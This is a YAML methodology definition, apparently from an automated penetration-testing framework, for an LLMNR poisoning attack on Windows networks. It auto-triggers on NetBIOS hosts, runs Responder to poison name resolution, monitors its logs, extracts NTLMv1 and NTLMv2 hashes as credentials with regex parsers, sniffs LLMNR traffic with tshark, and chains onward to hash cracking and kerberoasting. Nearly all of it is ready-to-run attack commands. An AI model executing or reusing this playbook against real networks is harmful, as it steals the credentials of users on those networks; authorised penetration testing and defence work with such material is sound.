id: llmnr_poisoning
name: LLMNR Poisoning Attack
version: 1.0.0
category: exploitation
description: Perform LLMNR poisoning to capture network credentials
rationale: LLMNR is enabled by default on Windows and can be exploited to capture hashes
risk_level: high
stealth_level: aggressive
estimated_duration_minutes: 60

triggers:
  - id: windows_network_detected
    type: custom_condition
    description: Trigger when Windows hosts are detected on the network
    priority: 15
    conditions:
      logic: and
      groups:
        - operator: exists
          field: asset.services
        - operator: contains
          field: asset.services.name
          value: netbios
    deduplication:
      strategy: signature_based
      signature_fields: [network_segment]
      cooldown_seconds: 7200
      max_executions: 1

execution_methods:
  - id: setup_responder
    name: Setup Responder
    description: Configure and start Responder for LLMNR poisoning
    type: command
    command: sudo responder -I {{INTERFACE}} -A
    variants:
      - condition: INTERFACE == "undefined"
        command: sudo responder -I eth0 -A
        description: Use default interface
      - condition: stealth_level == "passive"
        command: sudo responder -I {{INTERFACE}} -A --lm
        description: Only target LM protocols
    expected_outputs:
      - type: responder_startup
        parser: text
        success_indicators:
          - "NBT-NS, LLMNR & MDNS responder started"
          - "Listening for events"
        failure_indicators:
          - "Permission denied"
          - "Interface not found"
    timeout_seconds: 10

  - id: monitor_captures
    name: Monitor Hash Captures
    description: Monitor Responder logs for captured hashes
    type: command
    command: tail -f /usr/share/responder/logs/*.txt
    expected_outputs:
      - type: hash_capture
        parser: text
        success_indicators:
          - "NTLMv2-SSP Hash"
          - "NTLMv1 Hash"
        failure_indicators:
          - "No such file"
    asset_discovery:
      - pattern: "NTLMv2-SSP Hash\\s+:\\s+(\\S+)::(\\S+):(\\S+):(\\S+):(\\S+)"
        asset_type: credential
        confidence: 0.95
        metadata:
          type: ntlmv2_hash
          captured_method: llmnr_poisoning
      - pattern: "NTLMv1 Hash\\s+:\\s+(\\S+)::(\\S+):(\\S+):(\\S+)"
        asset_type: credential
        confidence: 0.9
        metadata:
          type: ntlmv1_hash
          captured_method: llmnr_poisoning
    timeout_seconds: 3600

  - id: analyze_traffic
    name: Analyze Network Traffic
    description: Analyze captured network traffic for additional intelligence
    type: command
    command: tshark -i {{INTERFACE}} -f "udp port 5355 or udp port 137" -c 100
    expected_outputs:
      - type: traffic_analysis
        parser: text
        success_indicators:
          - "LLMNR"
          - "NBT-NS"
    asset_discovery:
      - pattern: "(\\d+\\.\\d+\\.\\d+\\.\\d+)\\s+->\\s+(\\d+\\.\\d+\\.\\d+\\.\\d+)\\s+LLMNR"
        asset_type: host
        confidence: 0.8
        metadata:
          protocol: llmnr
          direction: request
    timeout_seconds: 120

expected_asset_types:
  - credential
  - ntlm_hash
  - host

suppression_options:
  - scope: network
    description: Skip LLMNR poisoning for this network
    conditions:
      - network_is_isolated
      - llmnr_disabled_network_wide
  - scope: engagement
    description: Skip LLMNR attacks entirely
    conditions:
      - client_prohibits_network_attacks
      - stealth_requirements_too_high

next_methodologies:
  - hash_cracking
  - credential_validation
  - kerberoasting